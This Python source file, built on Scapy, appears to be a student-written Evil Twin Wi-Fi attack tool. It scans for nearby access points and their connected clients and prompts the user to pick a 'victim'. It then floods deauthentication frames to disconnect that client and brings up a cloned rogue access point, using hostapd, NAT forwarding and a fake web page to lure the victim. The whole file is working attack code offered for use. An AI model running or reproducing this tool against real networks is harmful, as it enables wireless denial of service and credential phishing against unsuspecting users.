from scapy.all import *
import os
import sys
import time
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt
import change_modes
import helper

"""
Information:
addr1: destination/receiver MAC , addr2: source/sender MAC,  addr3: AP MAC
"""

interface_name = ""
chosen_ap_mac = ""
ap_list = list()
ssid_list = list()
users = list()


def AP_handler(pkt):
    """
    The handler for the sniffing access points (802.11 layer and of type beacon only)
    For each AP found it adds it to the global AP list.
    :param pkt:
    :return:
    """
    global ap_list
    # Checking if the packets have a 802.11 layer and only of type beacon
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
        mac_addr = pkt[Dot11].addr2
        ap_name = pkt[Dot11Elt].info.decode()
        if mac_addr not in [ap[0] for ap in ap_list]:
            channel = pkt[Dot11Beacon].network_stats().get("channel")
            ap_list.append([mac_addr, ap_name, channel])
            print(f"\tFound new AP: {ap_name}")


def users_handler(pkt):
    """
    The handler for the sniffing access users connected to the chosen access point.
    For each user found it adds it to the global users list.
    :param pkt:
    :return:
    """
    global users, chosen_ap_mac
    if (pkt.addr2 == chosen_ap_mac or pkt.addr3 == chosen_ap_mac) and \
            pkt.addr1 not in users and \
            pkt.addr1 != "ff:ff:ff:ff:ff:ff" and \
            pkt.addr1 != pkt.addr2 and \
            pkt.addr1 != pkt.addr3:
        users.append(pkt.addr1)
        print(f"{len(users)}\t{pkt.addr1}")


def scan_wlan(iface, channel_range=15, timeout=3):
    """
    Function to scan access points in the area
    :param iface: interface name
    :param channel_range: range of channels to scan on
    :param timeout: timeout length for each channel
    :return:
    """
    print("\n\nScanning for access points...")
    print("Index\tAP Name\t\tMAC")
    for channel in range(1, channel_range):
        helper.scan_channels(iface, channel)
        sniff(iface=iface, count=0, prn=AP_handler, timeout=timeout)


def scan_for_users(iface, channel_range=12, timeout=3):
    """
    Function to scan users connected to the chosen access point.
    :param iface: interface name
    :param channel_range: range of channels to scan users on
    :param timeout: timeout length for each channel
    :return:
    """
    print("\n\nScanning for users...")
    print("Index\tUser MAC")
    for channel in range(1, channel_range):
        helper.scan_channels(iface, channel, typeAP=False)
        try:
            sniff(iface=iface, prn=users_handler, timeout=timeout)
        except:
            continue


def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr, channel):
    """
    Function to deauthenticate and disconnect the chosen victim from his AP.
    RadioTap is an additional layer, making it easier to transmit info between OSI Layers.
    First layer being a 802.11 layer with our input info for the attack
    Second Layer being the de-authentication DoS step: reason=1 -> unspecified reason
    :param iface: interface name
    :param victim_mac_addr: the mac address of the chosen victim
    :param ap_mac_addr: the mac address of the chosen AP
    :param channel: the channel of the AP
    :return:
    """
    os.system(f"sudo iwconfig {iface} channel {channel}")

    victim_packet = RadioTap() \
                    / Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr, type=0, subtype= 12) \
                    / Dot11Deauth(reason=1)
    ap_packet = RadioTap() \
                / Dot11(addr1=ap_mac_addr, addr2=victim_mac_addr, addr3=ap_mac_addr, type=0, subtype= 12) \
                / Dot11Deauth(reason=1)
    # Send 100 packets for each, with a 0.2 interval between each packet to ensure proper de-authentication
    sendp(victim_packet, inter=0.2, count=100, iface=iface, verbose=1)
    sendp(ap_packet, inter=0.2, count=100, iface=iface, verbose=1)


def scan_captured_networks(ap_list, flag):
    """
    Function to choose a network from the scanned access points in the area
    :param ap_list: the global list of found access points
    :param flag: in case no users were found on chosen AP, it will run again
    :return:
    """
    global chosen_ap_mac
    captured = list(enumerate(ap_list, 1))
    print("\nAccess Points Captured:\n\n")
    for key, value in captured:
        print(f"{key} - {value}")
    if len(captured) == 0:
        print("No Access Points found!\n")
        return -1
    try:
        chosen_ap = int(input("Choose an AP index to attack from the list above: "))
        chosen_ap = captured[chosen_ap - 1][1]
        print("Chosen AP is ", chosen_ap)
    except:
        print("ERROR: Choose an AP with an index from the list above")
        scan_captured_networks(ap_list)
    chosen_ap_mac = chosen_ap[0]
    if flag:
        scan_for_users(interface_name)
        choose_user_to_attack(users)
    return chosen_ap


def choose_user_to_attack(user_list):
    """
    Function to choose a user/victim that is connected to the chosen AP
    :param user_list:
    :return:
    """
    captured = list(enumerate(user_list, 1))
    print("\nUsers captured on chosen access point:\n\n")
    for key, value in captured:
        print(f"{key} - {value}")

    if len(captured) == 0:
        print("No users found on the chosen AP, choose another AP:\n")
        scan_captured_networks(ap_list, flag=True)
    try:
        chosen_user = int(input("Choose a user to attack from the list above: "))
        chosen_user = captured[chosen_user - 1][1]
        print("Chosen Victim is ", chosen_user)
    except:
        print("ERROR: Choose a user with an index from the list above")
        choose_user_to_attack(user_list)

    return chosen_user


# Not used, but idea taken from here: https://www.thepythoncode.com/code/create-fake-access-points-scapy
def send_beacon(iface, ssid, victim_mac_addr, mac, infinite=True):
    """
    Target function to send a beacon packet to create a fake AP
    :param iface: interface name
    :param ssid: name for the fake AP
    :param victim_mac_addr: victim mac address
    :param mac: mac address for the fake AP
    :param infinite: if to keep the fake AP forever until closed manually
    :return:
    """
    # type=0:       management frame
    # subtype=8:    beacon frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon()  # init the beacon frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))  # inject the ssid name
    frame = RadioTap() / dot11 / beacon / essid  # add a RadioTap and stack all the layers
    # send the frame
    if infinite:
        sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)
    else:
        sendp(frame, iface=iface, verbose=0)


# Not used, but idea taken from here: https://www.thepythoncode.com/code/create-fake-access-points-scapy
def create_fake_ap(iface, victim, ap_name):
    """
    Creating a fake AP
    :param iface: interface name
    :param victim: chosen victim mac address
    :param ap_name: SSID name for the fake AP created
    :return:
    """
    global chosen_ap_mac
    fake_mac_addr = RandMAC()
    Thread(target=send_beacon, args=(iface, ap_name, victim, fake_mac_addr)).start()
    print(f"\n*****\nFake AP Created:\nAP Name: {ap_name}\nAP Mac Address: {fake_mac_addr}\n*****")


# Helped using this website: https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/
def activate_fake_ap(iface, ssid):
    """
    Activating the fake AP we are creating using configurations from our hostapd file.
    Also making the necessary changes and enable nat forwarding to use our wifi for its internet connection.
    :param iface:
    :param ssid:
    :return:
    """
    helper.reset()
    helper.kill_processes()
    helper.create_hostapd_file(iface, ssid)
    os.system(f"sudo service apache2 start")
    # Start the fake access point in new terminal
    os.system("sudo gnome-terminal -- sh -c 'sudo hostapd conf_files/hostapd.conf -B; read line'")

    os.system(f"sudo ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0")
    os.system("sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")

    helper.ip_tables_config()
    helper.enable_nat("enp2s0f0", iface)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Enabling IP forwarding: 1-enable, 0-disable
    os.system("sudo gnome-terminal -- sh -c 'firefox fake_web/index.html; readline'")
    os.system("sudo ip route add 192.168.1.0/24 dev enp2s0f0")


def deactivate_fake_ap(iface):
    """
    Function to deactivate the fake AP that was created at the end of the program and reset.
    :param iface: interface name
    :return:
    """
    helper.reset()
    os.system("sudo ufw reload")
    os.system("sudo systemctl enable systemd-resolved.service")
    os.system("sudo systemd-resolve --flush-caches")
    os.system("sudo service network-manager restart")
    # os.system(f"sudo airmon-ng start {iface}")


def network_attack(iface):
    """
    Main program that is used for the Evil Twin attack, which maintains the order of actions for the attack.
    :param iface: interface name
    :return:
    """
    global interface_name, ap_list, users
    interface_name = iface
    # change_modes.init_attack_mode()
    change_modes.activate_monitor_mode(iface)

    scan_wlan(iface, channel_range=15, timeout=3)
    chosen_ap = scan_captured_networks(ap_list, flag=False)

    # Found Access Points
    if chosen_ap == -1:
        action = int(input("Couldn't find any AP's in your area, what would you like to do?\n"
                           "1- Try again\n2- Exit"))
        if action == 1:
            network_attack(iface)
        else:
            sys.exit(1)

    scan_for_users(iface, channel_range=15, timeout=3)
    victim = choose_user_to_attack(users)

    deauthenticate_victim(iface, victim, chosen_ap_mac, channel=chosen_ap[2])

    # change_modes.deactivate_monitor_mode(iface)

    ap_name = chosen_ap[1]
    # create_fake_ap(iface, victim, ap_name="FakeAPHere!")
    activate_fake_ap(iface, ssid=ap_name)

    deactivate = input("\n\nTo deactivate the fake AP, enter 'Y'... ")
    if deactivate.lower() == 'y' or deactivate.lower() == 'yes':
        deactivate_fake_ap(iface)

    print("\n\nThanks for using our Evil Twin Tool!\n- Alon Firestein\n- Dvir Shaul\n- Yogev Chiprut")

